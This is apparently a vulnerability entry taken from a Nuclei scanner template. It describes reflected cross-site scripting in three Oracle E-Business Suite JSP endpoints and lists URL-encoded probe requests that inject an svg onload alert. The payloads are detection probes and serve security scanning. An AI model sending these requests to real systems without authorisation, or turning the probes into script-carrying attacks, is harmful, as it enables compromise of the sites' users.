# Vulnerability: Oracle E-Business Suite - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`oracle-ebs-xss.yaml`)

## Description
Oracle E-Business Suite is vulnerable to Cross Site Scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
GET {{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
GET {{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
```

